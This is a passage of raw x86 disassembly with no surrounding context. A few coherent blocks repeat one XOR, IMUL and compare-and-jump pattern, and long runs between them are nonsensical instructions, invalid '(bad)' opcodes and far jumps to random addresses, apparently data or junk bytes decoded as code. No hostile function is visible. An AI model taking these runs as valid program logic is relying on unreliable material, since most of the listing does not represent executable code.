  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a4e
  403acb:	inc    esi
  403acc:	adc    ebp,edi
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403aff
  403ad7:	xor    edx,DWORD PTR [ecx]
  403ad9:	push   esp
  403ada:	or     BYTE PTR [edi-0x63],ah
  403add:	xlat   BYTE PTR ds:[ebx]
  403ade:	outs   dx,DWORD PTR ds:[esi]
  403adf:	test   DWORD PTR [edi+ebx*4+0x6610d191],0xa7478404
  403aea:	mov    esp,0x766edf1b
  403aef:	mov    dl,0xf3
  403af1:	hlt    
  403af2:	mov    al,0xa3
  403af4:	pop    edx
  403af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403af6:	jge    0x403a9c
  403af8:	adc    al,0x45
  403afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403afb:	lock cmp al,0x2d
  403afe:	jne    0x403b49
  403b00:	arpl   WORD PTR [edi+0x52],di
  403b03:	pop    edx
  403b04:	sbb    bh,ch
  403b06:	sub    DWORD PTR [bp+0x42],ecx
  403b0a:	jmp    0x403ad0
  403b0c:	mov    dl,BYTE PTR [ecx+0x23e5ed82]
  403b12:	sub    eax,0x55c4527b
  403b17:	mov    esi,0xeff5d295
  403b1c:	pop    ebp
  403b1d:	fwait
  403b1e:	lock adc DWORD PTR ds:0xb244e5da,ecx
  403b25:	sti    
  403b26:	xor    bl,BYTE PTR [esi-0x1f6c9080]
  403b2c:	pushf  
  403b2d:	mov    ds:0x46f5812f,al
  403b32:	inc    eax
  403b33:	outs   dx,DWORD PTR ds:[esi]
  403b34:	jbe    0x403b53
  403b36:	sbb    dh,bh
  403b38:	retf   
  403b39:	xor    al,0xc5
  403b3b:	inc    eax
  403b3c:	jmp    0x8f6f:0x1154ef1c
  403b43:	mov    cl,ch
  403b45:	sahf   
  403b46:	in     eax,dx
  403b47:	fistp  QWORD PTR [edi+ebx*8]
  403b4a:	retf   
  403b4b:	aam    0xdb
  403b4d:	cld    
  403b4e:	pop    ds
  403b4f:	(bad)  
  403b50:	mov    cl,0x22
  403b52:	leave  
  403b53:	ds mov cl,0xb2
  403b56:	clc    
  403b57:	add    eax,0xe7d99da8
  403b5c:	mov    cl,0x35
  403b5e:	inc    ecx
  403b5f:	ss push esp
  403b61:	adc    bh,ch
  403b63:	ficomp DWORD PTR [ebx+eiz*2+0x7]
  403b67:	into   
  403b68:	jns    0x403afc
  403b6a:	dec    eax
  403b6b:	pop    ebp
  403b6c:	adc    DWORD PTR ds:[ebx+0x15d0476f],edx
  403b73:	out    dx,eax
  403b74:	jle    0x403b1d
  403b76:	sbb    DWORD PTR [edx-0xc2e98a7],ebx
  403b7c:	ss mov esi,0x3b5f1244
  403b82:	mov    cl,0x8a
  403b84:	xchg   edx,eax
  403b85:	mov    dh,0x48
  403b87:	nop
  403b88:	mov    al,0x76
  403b8a:	or     eax,0x70f06dd6
  403b8f:	and    edi,DWORD PTR [esi]
  403b91:	push   cs
  403b92:	push   esi
  403b93:	rcr    BYTE PTR [ebx+0x71],cl
  403b96:	xor    BYTE PTR [edx-0x2fbc80e1],0xea
  403b9d:	mov    cl,0xbd
  403b9f:	and    ebp,ebx
  403ba1:	ins    BYTE PTR es:[edi],dx
  403ba2:	out    0xcd,al
  403ba4:	lods   al,BYTE PTR ds:[esi]
  403ba5:	inc    ecx
  403ba6:	sub    dl,BYTE PTR [ebp-0x32]
  403ba9:	mov    bh,0x2a
  403bab:	(bad)  
  403bac:	sti    
  403bad:	(bad)  
  403bae:	adc    bh,BYTE PTR [esi]
  403bb0:	ss pop ebx
  403bb2:	xchg   esp,eax
  403bb3:	ins    BYTE PTR es:[edi],dx
  403bb4:	cmp    DWORD PTR [edx-0x5e5e75d5],edi
  403bba:	inc    esi
  403bbb:	les    ebx,FWORD PTR [esi]
  403bbd:	sbb    eax,0x11102296
  403bc2:	xor    DWORD PTR [edi-0x6d],esi
  403bc5:	mov    edx,0xfa4e418
  403bca:	fst    DWORD PTR [ecx+ebx*8+0x77417570]
  403bd1:	rcr    bl,cl
  403bd3:	push   edx
  403bd4:	rol    DWORD PTR [ecx],cl
  403bd6:	cmp    al,0xc8
  403bd8:	dec    ebp
  403bd9:	xor    edi,0x4c79b30c
  403bdf:	dec    ebp
  403be0:	add    DWORD PTR [eax],edx
  403be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403be3:	mov    esp,0x75ec22bf
  403be8:	mov    dl,0x84
  403bea:	jnp    0x403c0b
  403bec:	fsub   DWORD PTR [edx]
  403bee:	idiv   BYTE PTR [esi-0x712fba9d]
  403bf4:	sbb    eax,0xa1544d4c
  403bf9:	sub    dh,BYTE PTR [edi]
  403bfb:	(bad)  
  403bfc:	fisub  DWORD PTR [edi-0x250c1791]
  403c02:	mov    ebx,0x376a5109
  403c07:	ficom  DWORD PTR [edx+0x2e]
  403c0a:	jne    0x403c34
  403c0c:	mov    al,ds:0x7df5d08d
  403c11:	mov    dh,BYTE PTR [eax]
  403c13:	into   
  403c14:	pushf  
  403c15:	or     dl,BYTE PTR [esi-0x75e3054e]
  403c1b:	mov    ebx,0x5e47d4e5
  403c20:	xchg   ecx,eax
  403c21:	int3   
  403c22:	mov    bh,0x55
  403c24:	(bad)  
  403c25:	cld    
  403c26:	mov    esi,0xb12f18d7
  403c2b:	mov    eax,0x45232aa4
  403c30:	sub    al,0xce
  403c32:	push   ecx
  403c33:	or     esp,DWORD PTR [ebp+0x55d5457f]
  403c39:	loopne 0x403c5d
  403c3b:	pushf  
  403c3c:	les    esi,FWORD PTR [edx-0x14]
  403c3f:	inc    esp
  403c40:	ss jecxz 0x403c0b
  403c43:	adc    DWORD PTR [edi-0x3f052cf5],ecx
  403c49:	out    0xbb,al
  403c4b:	lods   eax,DWORD PTR ds:[esi]
  403c4c:	sahf   
  403c4d:	lods   eax,DWORD PTR ds:[esi]
  403c4e:	stc    
  403c4f:	and    eax,0x970492e
  403c54:	cwde   
  403c55:	loop   0x403cb2
  403c57:	es or  eax,0xc2eb81fd
  403c5d:	fidivr WORD PTR [ebx+edi*1-0x137615f8]
  403c64:	add    al,0xf9
  403c66:	(bad)
  403c69:	push   esp
  403c6a:	or     esp,0xffffffa4
  403c6d:	(bad)  
  403c6e:	in     al,0x55
  403c70:	dec    esp
  403c71:	fbld   TBYTE PTR ds:0x5bbb9f
  403c77:	out    dx,eax
  403c78:	xchg   DWORD PTR [edx+0x74f88945],eax
  403c7e:	mov    ch,dh
  403c80:	sti    
  403c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c82:	dec    ebx
  403c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c84:	or     esi,eax
  403c86:	push   ds
  403c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c88:	leave  
  403c89:	clc    
  403c8a:	mov    al,ds:0x78164194
  403c8f:	test   al,0xdb
  403c91:	adc    al,0x3e
  403c93:	and    BYTE PTR [ebx+edi*4+0x34d502e9],bh
  403c9a:	jbe    0x403c8e
  403c9c:	fild   WORD PTR [ecx+0x42560ba4]
  403ca2:	pop    eax
  403ca3:	rep ins DWORD PTR es:[edi],dx
  403ca5:	into   
  403ca6:	ror    DWORD PTR [ecx],cl
  403ca8:	inc    edi
  403ca9:	pusha  
  403caa:	out    0x28,eax
  403cac:	cs ret 0xb729
  403cb0:	xlat   BYTE PTR ds:[ebx]
  403cb1:	jmp    0x23b5:0xbb9cd442
  403cb8:	rcl    edx,1
  403cba:	(bad)  
  403cbb:	mov    esi,0x78ded88c
  403cc0:	neg    DWORD PTR ds:0xa7dbe065
  403cc6:	push   ebp
  403cc7:	bnd jns 0x403c61
  403cca:	mov    bl,0x5f
  403ccc:	cmp    BYTE PTR [ecx],bh
  403cce:	imul   edi,DWORD PTR [ecx+esi*1-0x2c0cf6dc],0x29
  403cd6:	jnp    0x403cc7
  403cd8:	call   0x266f:0x8615913c
  403cdf:	cwde   
  403ce0:	add    ebx,DWORD PTR [esi-0x6d]
  403ce3:	pop    ss
  403ce4:	pop    ebx
  403ce5:	hlt    
  403ce6:	inc    cl
  403ce8:	and    esp,DWORD PTR [ebx]
  403cea:	mov    eax,ds:0x8139515c
  403cef:	adc    al,0xcf
  403cf1:	daa    
  403cf2:	hlt    
  403cf3:	out    dx,al
  403cf4:	loop   0x403cba
  403cf6:	and    DWORD PTR [ebx+0x2620c5e9],ecx
  403cfc:	sub    ch,bh
  403cfe:	std    
  403cff:	addr16 dec esp
  403d01:	sub    al,0x38
  403d03:	pop    eax
  403d04:	(bad)  
  403d05:	mov    ecx,ebx
  403d07:	cmc    
  403d08:	mul    bh
  403d0a:	ss mov ah,0xe0
  403d0d:	add    eax,0xe0ded4af
  403d12:	into   
  403d13:	mov    bl,0x64
  403d15:	push   eax
  403d16:	mov    esi,0x9ab87892
  403d1b:	and    eax,0x76eee37d
  403d20:	add    eax,0x248152da
  403d25:	mov    ds:0xf26cdf18,eax
  403d2a:	push   es
  403d2b:	adc    DWORD PTR [esi+0x64280806],eax
  403d31:	mov    edx,0x40290a1a
  403d36:	push   ds
  403d37:	cmc    
  403d38:	sahf   
  403d39:	inc    esp
  403d3a:	xor    eax,0xdb2e66ef
  403d3f:	(bad)  
  403d41:	mov    esp,0xa135daea
  403d47:	or     eax,0x678d38dd
  403d4c:	xor    DWORD PTR [ecx-0x15],ecx
  403d4f:	pop    ds
  403d50:	jbe    0x403d06
  403d52:	push   es
  403d53:	popf   
  403d54:	xchg   edi,ecx
  403d56:	sub    BYTE PTR [ecx-0x3cd5308],ch
  403d5c:	sahf   
  403d5d:	or     eax,DWORD PTR [esi+0x63b54112]
  403d63:	mov    cl,0xb4
  403d65:	cdq    
  403d66:	mov    BYTE PTR [esi+edi*8],cl
  403d69:	add    eax,0x35d22ac
  403d6e:	lods   eax,DWORD PTR ds:[esi]
  403d6f:	mov    ch,0xc1
  403d71:	inc    ebp
  403d72:	mov    ecx,0x58e66070
  403d77:	test   eax,0x8992175a
  403d7c:	sub    BYTE PTR [edx-0x62],bl
  403d7f:	and    DWORD PTR [edi+eiz*8+0x274a90a3],eax
  403d86:	sti    
  403d87:	pushf  
  403d88:	fstp   QWORD PTR [ecx+0x3fe52303]
  403d8e:	mov    cl,BYTE PTR [ebx]
  403d90:	std    
  403d91:	aas    
  403d92:	xor    WORD PTR [ebp+0x49],0x9e4c
  403d98:	outs   dx,DWORD PTR ds:[esi]
  403d99:	xchg   ebx,eax
  403d9a:	add    ebp,DWORD PTR [edx-0x6d]
  403d9d:	fcomp  st(1)
  403d9f:	xor    DWORD PTR [ebx+0x74],edi
  403da2:	jmp    0xbf1c:0x1c68152b
  403da9:	imul   ebp,DWORD PTR [ebx+edx*4],0x66
  403dad:	fiadd  WORD PTR [edx+ebx*8]
  403db0:	dec    edx
  403db1:	cwde   
  403db2:	in     eax,0x86
  403db4:	sbb    DWORD PTR [edx-0x7d86530b],ecx
  403dba:	xor    DWORD PTR [edi-0x75],0x5d
  403dbe:	lock sub ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x1c
  403e75:	push   DWORD PTR [ebp+0x21]
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e60
  403e81:	cdq    
  403e82:	jp     0x403efb
  403e84:	ror    DWORD PTR ds:0x5e90bd11,1
  403e8a:	adc    BYTE PTR [edi],0xba
  403e8d:	xchg   ebx,eax
  403e8e:	shl    BYTE PTR [ecx+0x3],1
  403e91:	call   0x9c307f85
  403e96:	data16 mov cl,0xa7
  403e99:	(bad)
  403e9c:	jo     0x403ef2
  403e9e:	sbb    al,0x40
  403ea0:	dec    esp
  403ea1:	retf   0x94b2
  403ea4:	(bad)  
  403ea5:	loope  0x403e4b
  403ea7:	es call 0xe622:0x6e5a9f87
  403eaf:	outs   dx,DWORD PTR ds:[esi]
  403eb0:	push   es
  403eb1:	inc    edx
  403eb2:	mov    ecx,0xbbc34b0a
  403eb7:	pop    ds
  403eb8:	daa    
  403eb9:	sub    DWORD PTR [si-0x3d],ecx
  403ebd:	stos   DWORD PTR es:[edi],eax
  403ebe:	sti    
  403ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ec0:	mov    bh,0x95
  403ec2:	es cwde 
  403ec4:	les    ecx,FWORD PTR [ebx]
  403ec6:	sbb    DWORD PTR ds:0x303f5c81,ecx
  403ecc:	pop    esp
  403ecd:	add    ch,ch
  403ecf:	inc    ebp
  403ed0:	in     al,0xbd
  403ed2:	mov    al,BYTE PTR [edi+0x352695f7]
  403ed8:	mov    ah,0xda
  403eda:	test   al,0x5b
  403edc:	ret    0xce53
  403edf:	mov    BYTE PTR [eax+ebx*8],dh
  403ee2:	adc    edx,DWORD PTR [esi-0x6ed07021]
  403ee8:	jmp    0x403ea8
  403eea:	adc    al,0xb9
  403eec:	int    0x43
  403eee:	test   al,0xd3
  403ef0:	xchg   DWORD PTR [eax-0x5ad46c74],ebp
  403ef6:	sbb    eax,DWORD PTR cs:0x9c773c09
  403efd:	test   DWORD PTR [eax],edx
  403eff:	jnp    0x403ee2
  403f01:	sahf   
  403f02:	xlat   BYTE PTR ds:[ebx]
  403f03:	fdivr  QWORD PTR [edx+eiz*4]
  403f06:	icebp  
  403f07:	stos   BYTE PTR es:[edi],al
  403f08:	div    BYTE PTR [edi+0x197a8c82]
  403f0e:	dec    esi
  403f0f:	scas   al,BYTE PTR es:[edi]
  403f10:	rol    ecx,0x6d
  403f13:	and    BYTE PTR [ebp-0x4049a3c2],bl
  403f19:	clc    
  403f1a:	cmc    
  403f1b:	(bad)
  403f1e:	mov    al,ds:0xf49282f2
  403f23:	xrelease mov DWORD PTR [esi-0x601f4c4c],0xa0306f11
  403f2e:	fst    DWORD PTR [ecx-0x5a94476c]
  403f34:	and    DWORD PTR ds:0xe7af02b2,ebp
  403f3a:	fadd   DWORD PTR ds:0x38721be
  403f40:	out    0x66,eax
  403f42:	stos   DWORD PTR es:[edi],eax
  403f43:	adc    esi,esi
  403f45:	pop    edx
  403f46:	rcl    DWORD PTR [ecx+0x1f8ba440],1
  403f4c:	push   ss
  403f4d:	fcom   QWORD PTR ds:0xed3ef646
  403f53:	cmp    ebp,DWORD PTR [ecx-0x69]
  403f56:	in     eax,0xc0
  403f58:	inc    eax
  403f59:	bound  ebp,QWORD PTR ds:0xc909bdc2
  403f5f:	into   
  403f60:	repz mov al,0xdd
  403f63:	aam    0xd8
  403f65:	and    eax,ebx
  403f67:	push   ebx
  403f68:	pop    ebp
  403f69:	ins    DWORD PTR es:[edi],dx
  403f6a:	and    DWORD PTR [ebx],esi
  403f6c:	sbb    eax,0xea864ecb
  403f71:	sub    eax,0x404c3f1d
  403f76:	sbb    bh,BYTE PTR ds:0xa48f2ef3
  403f7c:	cli    
  403f7d:	sti    
  403f7e:	pushf  
  403f7f:	dec    ebp
  403f80:	shl    BYTE PTR [ebp+0x1c],1
  403f83:	lahf   
  403f84:	imul   ecx,DWORD PTR [esi+0x4ebb6639],0x3e
  403f8b:	outs   dx,DWORD PTR ds:[esi]
  403f8c:	sbb    esi,edx
  403f8e:	xchg   DWORD PTR [edi-0x31eab9c],esp
  403f94:	push   esi
  403f95:	sub    al,0x5a
  403f97:	daa    
  403f98:	adc    ch,BYTE PTR [eax+ebp*8-0x19]
  403f9c:	xor    al,0x1d
  403f9e:	out    dx,eax
  403f9f:	xchg   edi,eax
  403fa0:	mov    ds:0xae098b8d,al
  403fa5:	mov    eax,0x388136c6
  403faa:	pusha  
  403fab:	nop
  403fac:	inc    esi
  403fad:	aad    0xa9
  403faf:	imul   esp,eax,0x2df017b7
  403fb5:	mov    dl,0x8b
  403fb7:	jbe    0x403f59
  403fb9:	mov    al,ds:0xe8cfd8f8
  403fbe:	push   ds
  403fbf:	jo     0x403f5b
  403fc1:	jns    0x403f90
  403fc3:	in     al,0x73
  403fc5:	arpl   WORD PTR [ecx+0x3d254cbe],sp
  403fcb:	dec    eax
  403fcc:	inc    ebp
  403fcd:	xor    eax,0xc17c93b
  403fd2:	or     al,0xfe
  403fd4:	stos   DWORD PTR es:[edi],eax
  403fd5:	pop    ebp
  403fd6:	mov    WORD PTR [eax+0x6bdbd090],ds
  403fdc:	popf   
  403fdd:	jge    0x403fc7
  403fdf:	pop    ecx
  403fe0:	and    al,BYTE PTR [edx+0x2219b057]
  403fe6:	out    dx,al
  403fe7:	xchg   ebp,eax
  403fe8:	retf   
  403fe9:	fldz   
  403feb:	sti    
  403fec:	fisub  DWORD PTR [ebx+0x3c0b0bff]
  403ff2:	adc    ebx,DWORD PTR [edx+0x2c]
  403ff5:	(bad)  
  403ff6:	ror    DWORD PTR ds:0xe3a7b787,cl
  403ffc:	sbb    al,0x7f
  403ffe:	call   0x93b1:0x90d486d4
  404005:	dec    ecx
  404006:	add    eax,0xace7d3b8
  40400b:	in     eax,0x77
  40400d:	call   0x9ddf:0xc4e2adea
  404014:	xchg   DWORD PTR [ecx],ebp
  404016:	in     eax,dx
  404017:	in     al,dx
  404018:	jle    0x403fe9
  40401a:	sub    al,0x36
  40401c:	shl    al,0xcd
  40401f:	test   eax,0xc6535e9b
  404024:	xor    bh,BYTE PTR [edi-0x46f669ac]
  40402a:	leave  
  40402b:	outs   dx,BYTE PTR ds:[esi]
  40402c:	jmp    0x34178333
  404031:	fist   DWORD PTR [ebp-0x547a70ad]
  404037:	cs dec ecx
  404039:	(bad)
  40403d:	les    eax,FWORD PTR [ebx+0x3a]
  404040:	fwait
  404041:	pop    edi
  404042:	jno    0x404064
  404044:	add    dl,dh
  404046:	test   DWORD PTR [eax],ebp
  404048:	inc    esi
  404049:	xor    eax,0x6ab1b6e0
  40404e:	xsaves [ebx+0x2f]
  404052:	pop    ebp
  404053:	scas   eax,DWORD PTR es:[edi]
  404054:	mov    esi,0xba73d4e
  404059:	iret   
  40405a:	mov    DWORD PTR [esi],ebx
  40405c:	adc    DWORD PTR [esp+esi*1+0x46],ebp
  404060:	pop    esp
  404061:	fisub  DWORD PTR [eax-0xe]
  404064:	pop    ss
  404065:	add    DWORD PTR [edi+0x13],eax
  404068:	mov    ah,0xb6
  40406a:	(bad)
  40406d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40406e:	popf   
  40406f:	les    ebx,FWORD PTR [ebx]
  404071:	cld    
  404072:	dec    eax
  404073:	lea    eax,cs:[eax-0x51]
  404077:	adc    al,BYTE PTR [ebp-0x49]
  40407a:	mov    ebx,0x8bc42d95
  40407f:	xchg   ecx,eax
  404080:	pusha  
  404081:	dec    ecx
  404082:	std    
  404083:	test   al,0xc5
  404085:	sbb    DWORD PTR [ebx],esi
  404087:	into   
  404088:	mov    al,ds:0x9e920e09
  40408d:	les    edi,FWORD PTR [eax-0x2f]
  404090:	dec    eax
  404091:	jmp    0xf6bb:0xaa95f5a3
  404098:	dec    ebx
  404099:	aaa    
  40409a:	lea    esi,ds:0xecbd85c9
  4040a0:	push   ds
  4040a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a2:	or     cl,al
  4040a4:	(bad)  
  4040a6:	inc    edx
  4040a7:	aas    
  4040a8:	fwait
  4040a9:	adc    edx,esp
  4040ab:	inc    edi
  4040ac:	out    dx,eax
  4040ad:	or     DWORD PTR [ebx-0x4a],ecx
  4040b0:	add    DWORD PTR [ecx],esi
  4040b2:	call   0x6941a9e4
  4040b7:	or     BYTE PTR [eax+0x74b9a75d],ch
  4040bd:	xor    DWORD PTR [ebx-0x4e],edi
  4040c0:	and    al,0x91
  4040c2:	xchg   edi,eax
  4040c3:	out    dx,al
  4040c4:	mov    dl,0xb7
  4040c6:	repnz adc al,0x95
  4040c9:	es push 0xffffffbd
  4040cc:	int3   
  4040cd:	pop    ebp
  4040ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040cf:	dec    esi
  4040d0:	mov    al,0xcb
  4040d2:	mov    cl,0x89
  4040d4:	iret   
  4040d5:	mov    eax,0x97d67765
  4040da:	stos   BYTE PTR es:[edi],al
  4040db:	jns    0x4040ab
  4040dd:	gs sar ecx,0xdb
  4040e1:	dec    ecx
  4040e2:	sbb    ecx,ebp
  4040e4:	xlat   BYTE PTR ds:[ebx]
  4040e6:	leave  
  4040e7:	repz jge 0x40414a
  4040ea:	and    esi,ecx
  4040ec:	call   edi
  4040ee:	stos   DWORD PTR es:[edi],eax
  4040ef:	sub    edx,DWORD PTR [ebx+0x14]
  4040f2:	into   
  4040f3:	sub    BYTE PTR ds:[esi],0xf2
  4040f7:	and    bl,bh
  4040f9:	push   ecx
  4040fa:	fisubr DWORD PTR [edx+0x61c52b73]
  404100:	add    edx,DWORD PTR [ecx-0x57]
  404103:	inc    edx
  404104:	repz hlt 
  404106:	jge    0x404166
  404108:	stos   DWORD PTR es:[edi],eax
  404109:	and    DWORD PTR [ecx],eax
  40410b:	xchg   edx,eax
  40410c:	popf   
  40410d:	pop    ebx
  40410e:	stc    
  40410f:	ins    DWORD PTR es:[edi],dx
  404110:	test   BYTE PTR [edi-0x38],0x24
  404114:	add    al,0xb0
  404116:	(bad)  
  404117:	mov    edi,ss
  404119:	arpl   WORD PTR [ebp+esi*1+0x36],sp
  40411d:	dec    edx
  40411e:	mov    dl,0x13
  404120:	pop    ds
  404121:	lock mov ah,0x5
  404124:	ror    esp,cl
  404126:	in     al,0xfd
  404128:	inc    esi
  404129:	aas    
  40412a:	jo     0x404148
  40412c:	sbb    al,0xb5
  40412e:	aad    0x4c
  404130:	out    dx,eax
  404131:	xchg   ecx,eax
  404132:	daa    
  404133:	aaa    
  404134:	jmp    0x3590:0x97b52613
  40413b:	sbb    dh,0x6c
  40413e:	sbb    eax,0x3b071098
  404143:	outs   dx,BYTE PTR ds:[esi]
  404144:	adc    DWORD PTR [ebx],esi
  404146:	pop    esi
  404147:	(bad)  
  404148:	int    0xe8
  40414a:	xlat   BYTE PTR ds:[ebx]
  40414b:	aad    0x24
  40414d:	lods   eax,DWORD PTR ds:[esi]
  40414e:	push   0x50
  404150:	popa   
  404151:	add    DWORD PTR [esi-0x12],ecx
  404154:	xchg   ebp,eax
  404155:	shl    DWORD PTR [esi+edx*2],cl
  404158:	adc    al,0x8c
  40415a:	push   ebp
  40415b:	inc    esp
  40415c:	loop   0x404138
  40415e:	cmc    
  40415f:	lock ja 0x40413f
  404162:	imul   ecx,DWORD PTR [edi],0x11
  404165:	mov    ecx,0xda3bdf2b
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    bh,dl
  40418b:	add    ah,BYTE PTR [edx+0xa]
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041f7
  404197:	scas   eax,DWORD PTR es:[edi]
  404198:	test   BYTE PTR [ebp+0x5adad443],dl
  40419e:	adc    bl,BYTE PTR [ebx+0x53]
  4041a1:	sbb    ebp,DWORD PTR [edi+0x38]
  4041a4:	mov    edi,0x94b46856
  4041a9:	adc    eax,0x2a58fc23
  4041ae:	ret    
  4041af:	lds    esi,FWORD PTR [ecx+0x18]
  4041b2:	cmp    BYTE PTR [ecx+edi*4],0x7f
  4041b6:	js     0x40420e
  4041b8:	cmp    edi,DWORD PTR [eax]
  4041ba:	std    
  4041bb:	ins    BYTE PTR es:[edi],dx
  4041bc:	cld    
  4041bd:	pop    ds
  4041be:	in     al,0x2f
  4041c0:	or     DWORD PTR [eax],ebp
  4041c2:	fldenv [edi-0x6da528b3]
  4041c8:	ja     0x4041f9
  4041ca:	test   DWORD PTR [ecx],eax
  4041cc:	inc    ecx
  4041cd:	xor    BYTE PTR [edx-0x29],0x4b
  4041d1:	loop   0x404162
  4041d3:	mov    al,ds:0x9acfb5d3
  4041d8:	les    ebp,FWORD PTR [ebp-0xb3f1b1b]
  4041de:	add    al,0xdc
  4041e0:	pop    ebp
  4041e1:	cld    
  4041e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041e4:	popa   
  4041e5:	mov    bl,dh
  4041e7:	call   FWORD PTR [ebp+0xb8787c5]
  4041ed:	xor    ebp,DWORD PTR [esi+0x7d]
  4041f0:	pop    eax
  4041f1:	jp     0x40424a
  4041f3:	jge    0x40424e
  4041f5:	sub    BYTE PTR [eax+0x5b0d3c63],0x3f
  4041fc:	or     eax,0xb3664b3d
  404201:	and    dl,BYTE PTR [ebp-0x69dbe344]
  404207:	cli    
  404208:	ins    BYTE PTR es:[edi],dx
  404209:	or     al,0x51
  40420b:	ror    ebx,0xd6
  40420e:	je     0x404241
  404210:	and    ch,dl
  404212:	pop    ebp
  404213:	pop    ds
  404214:	jnp    0x40421e
  404216:	push   eax
  404217:	cmp    eax,0x3ab5427c
  40421c:	jge    0x4041c3
  40421e:	lods   eax,DWORD PTR gs:[esi]
  404220:	xchg   esi,eax
  404221:	ficomp DWORD PTR [edx]
  404223:	add    edi,eax
  404225:	xchg   ecx,eax
  404226:	or     bh,dh
  404228:	(bad)  
  404229:	hlt    
  40422a:	hlt    
  40422b:	test   DWORD PTR [esi-0x42],edx
  40422e:	icebp  
  40422f:	sub    DWORD PTR [ebx-0x63938c4f],eax
  404235:	push   esi
  404236:	mov    esi,0xa7bab196
  40423b:	adc    cl,bh
  40423d:	test   BYTE PTR [ebp-0x10623f73],al
  404243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404244:	mov    al,ds:0xbf792643
  404249:	cmp    ebp,0xff38eb69
  40424f:	push   ecx
  404250:	ins    BYTE PTR es:[edi],dx
  404251:	xchg   DWORD PTR [ebp+0x51],ebx
  404254:	cld    
  404255:	sub    BYTE PTR [edx],al
  404257:	leave  
  404258:	add    al,0xed
  40425a:	mov    esi,0x1ee5f0e0
  40425f:	jecxz  0x40422e
  404261:	test   BYTE PTR ds:0xe3290934,cl
  404267:	push   esi
  404268:	and    ecx,DWORD PTR ds:0xa934db31
  40426e:	jmp    0x404251
  404270:	xchg   DWORD PTR [ebx-0x43e9752e],ebx
  404276:	rol    cl,0x33
  404279:	xor    bh,dl
  40427b:	gs enter 0x8832,0x64
  404280:	push   ds
  404281:	xor    al,0xe4
  404283:	out    0x1c,al
